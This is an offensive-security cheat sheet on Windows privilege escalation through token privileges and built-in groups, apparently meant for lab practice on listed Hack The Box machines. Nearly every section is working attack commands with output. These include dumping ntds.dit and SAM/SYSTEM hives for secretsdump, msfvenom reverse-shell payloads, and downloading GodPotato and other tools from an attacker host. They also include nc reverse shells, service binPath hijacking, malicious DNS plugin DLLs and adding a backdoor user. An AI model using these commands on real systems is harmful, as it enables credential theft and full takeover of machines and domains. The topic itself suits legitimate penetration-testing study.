# Table of Contents

- [Privileges](#privileges)
  - [SeBackupPrivilege](#sebackupprivilege)
  - [SeLoadDriverPrivilege](#seloaddriverprivilege)
  - [SeImpersonatePrivilege](#seimpersonateprivilege)
  - [SeDebugPrivilege](#sedebugprivilege)
  - [SeTcbPrivilege](#setcbprivilege)
- [Built-in Groups](#built-in-groups)
  - [Backup Operators](#backup-operators)
  - [Server Operators](#server-operators)
  - [Account Operators](#account-operators)
  - [DnsAdmins](#dnsadmins)
- [Resources](#resources)
- [Practice](#practice)

# Privileges
### SeBackupPrivilege
```
> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
...
SeBackupPrivilege             Back up files and directories  Enabled
...
```
### Disk Shadow method
pwn.txt file content
```
set context persistent nowriters 
add volume c: alias pwn 
create 
expose %pwn% z: 
```
```
> upload pwn.txt
```
```
> diskshadow /s pwn.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  8/9/2024 10:57:34 PM

-> set context persistent nowriters
-> add volume c: alias pwn
-> create
Alias pwn for shadow ID {041d93f3-797d-4f91-a270-5c1fb66092e6} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {7df9215a-2efb-4a28-befe-cbaf15deba8c} set as environment variable.

Querying all shadow copies with the shadow copy set ID {7df9215a-2efb-4a28-befe-cbaf15deba8c}

        * Shadow copy ID = {041d93f3-797d-4f91-a270-5c1fb66092e6}               %pwn%
                - Shadow copy set: {7df9215a-2efb-4a28-befe-cbaf15deba8c}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 8/9/2024 10:57:36 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %pwn% z:
-> %pwn% = {041d93f3-797d-4f91-a270-5c1fb66092e6}
The shadow copy was successfully exposed as z:\.
->
```
```
> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, August 9, 2024 10:57:58 PM
   Source : z:\windows\ntds\
     Dest : C:\temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\
            New File              16.0 m        ntds.dit

[SNIP]
```
```
> reg save HKLM\SYSTEM c:\temp\system
The operation completed successfully.
```
```
> download system

Info: Downloading C:\temp\system to system

Info: Download successful!
```
```
> download ntds.dit

Info: Downloading C:\temp\ntds.dit to ntds.dit

Info: Download successful!
```
```
$ secretsdump.py -system system -ntds ntds.dit local
```
## SeLoadDriverPrivilege
-> https://github.com/k4sth4/SeLoadDriverPrivilege
```
$ msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
```
```
> upload Capcom.sys
> upload ExploitCapcom.exe
> upload eoploaddriver_x64.exe
> upload shell.exe
```
```
> .\eoploaddriver_x64.exe System\CurrentControlSet\dfserv C:\temp\Capcom.sys
```
```
> .\ExploitCapcom.exe LOAD \temp\Capcom.sys
```
```
> .\ExploitCapcom.exe EXPLOIT .\shell.exe
```
## SeImpersonatePrivilege
```
> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
...
```
```
> iwr http://<attacker_ip>/GodPotato-NET4.exe -outfile gp.exe
```
```
> .\gp.exe -cmd "C:\Users\Public\nc64.exe -e cmd.exe <attacker_ip> <port>"
[*] CombaseModule: 0x140733127524352
[*] DispatchTable: 0x140733130111304
[*] UseProtseqFunction: 0x140733129406688
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\eb27b3cc-7b5a-420d-8f01-d3094f6ee323\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00000402-0d08-ffff-8e84-859d1b28d501
[*] DCOM obj OXID: 0xd402854b19147ceb
[*] DCOM obj OID: 0x20ef4be3bfc76a84
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 892 Token:0x496  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3040
```
```
$ nc -nlvp 443
listening on [any] 443 ...

...

> whoami
nt authority\system
```
## SeDebugPrivilege
```
> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
### Method 1
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f exe LHOST=<ip> LPORT=<port> -o shell.exe
```
```
> iwr http://<ip>/shell.exe -outfile shell.exe
> .\shell.exe
```
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
msf6 exploit(multi/handler) > set lport 443
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on <attacker_ip>:<port>
[*] Sending stage (200774 bytes) to <target_ip>
[*] Meterpreter session 1 opened [SNIP]
```
```
meterpreter > hashdump
```
```
meterpreter > portfwd add -L 127.0.0.1 -l 445 -p 445 -r <target_ip>
```
```
smbexec.py administrator@127.0.0.1 -hashes :<hash>
```
### Method 2
```
meterpreter > ps winlogon
Filtering on 'winlogon'

Process List
============

 PID  PPID  Name          Arch  Session  User                 Path
 ---  ----  ----          ----  -------  ----                 ----
 548  468   winlogon.exe  x64   1        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe
```
```
meterpreter > migrate 548
[*] Migrating from 5036 to 548...

[*] Migration completed successfully. 
```
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
### Method 3
Using: https://github.com/xct/adopt
```
> upload adopt.exe
```
```
> .\adopt.exe vm3dservice.exe C:\windows\tasks\update.exe
[>] Target pid is 2508
[>] ShellExecuteExW is at 00007FFB7BF974A0
[>] Thread running, done! (Handle: 100)
```

## SeTcbPrivilege
```
> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
...
SeTcbPrivilege                Act as part of the operating system Enabled
...
```
-> https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178
```
> curl http://<attacker_ip>/TcbElevation.exe -o TcbElevation.exe
> curl http://<attacker_ip>/rcat_<attacker_ip>_443.exe -o rcat_<attacker_ip>_443.exe # https://github.com/xct/rcat
```
```
> .\TcbElevation.exe pwn "C:\Windows\system32\cmd.exe /c C:\Users\svc_deploy\Documents\rcat_<attacker_ip>_443.exe"
```
```
$ rlwrap nc -nlvp 443
listening on [any] 443 ...

...

> whoami
nt authority\system
```
# Built-in Groups
## Backup Operators
```
$ smbserver.py -smb2support share share
$ reg.py <domain>/<username>:<password>@<ip> backup -o '\\<attacker_ip>\share'

...

[*] Saved HKLM\SAM to \\10.10.14.8\share\SAM.save
[*] Saved HKLM\SYSTEM to \\10.10.14.8\share\SYSTEM.save
[*] Saved HKLM\SECURITY to \\10.10.14.8\share\SECURITY.save

$ secretsdump.py local -sam SAM.save -system SYSTEM.save -security SECURITY.save
```
Or
```
> reg save hklm\sam sam      
> download sam
> reg save hklm\system system
> download system
```
```
$ secretsdump.py -sam sam -system system LOCAL
```
Or using the [back_operator](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-backupop) module from NetExec
```
$ nxc smb <ip> -u <username> -p <password> -M backup_operator
```
## Server Operators
Its members can sign-in to a server, start and stop services, access domain controllers, perform maintenance tasks (such as backup and restore), and they have the ability to change binaries that are installed on the domain controllers.
```
> net user svc-printer
...
Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
```
```
> upload nc64.exe
```
```
> sc.exe config VMTools binPath="C:\temp\nc64.exe -e powershell.exe <attacker_ip> <port>"
[SC] ChangeServiceConfig SUCCESS
```
```
> sc.exe stop VMTools

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
```
> sc.exe start VMTools
```
```
$ rlwrap nc -nlvp 9001
listening on [any] 9001 ...

...

> whoami
nt authority\system
```
## Account Operators
This group can create and manage many non-admin accounts.
```
> net user meow P@ssw0rd /add
> net localgroup IIS_IUSRS meow /add
> net localgroup "Remote Management Users" meow /add
```
Now the user meow has the SeImpersonatePrivilege
```
> .\gp.exe -cmd "C:\programdata\nc64.exe -e cmd.exe <attacker_ip> 443"
```
## DnsAdmins
When we are member of this group we can ask the machine to load an arbitrary DLL file when the service starts so that gives us RCE as SYSTEM. We can re-configure the service and we have the required privileges to restart it.
```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o shell.dll
```
```
> upload shell.dll
```
```
> cmd /c 'dnscmd <DC> /config /serverlevelplugindll C:\temp\shell.dll'

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
```
> sc.exe \\<DC> stop dns

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
```
> sc.exe \\<DC> start dns

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3500
        FLAGS
```
```
$ rlwrap nc -nlvp 9001

...

> whoami
nt authority\system
```
# Resources
- https://x.com/fr0gger_/status/1379465943965909000
- https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/
- https://github.com/k4sth4/SeLoadDriverPrivilege
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
- https://x.com/splinter_code/status/1568548572861267968
- https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178
- https://snowscan.io/htb-writeup-blackfield/
- https://snowscan.io/htb-writeup-resolute/
- https://www.thehacker.recipes/a-d/movement/domain-settings/builtin-groups
- https://www.thehacker.recipes/ad/movement/builtins/security-groups
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
- https://web.archive.org/web/20230129100526/https://cube0x0.github.io/Pocing-Beyond-DA/
- https://0xdf.gitlab.io/2024/06/08/htb-pov.html#exploit-sedebug
## Practice
- Baby
- Blackfield
- Resolute
- Fuse
- POV
- Job
- Sidecar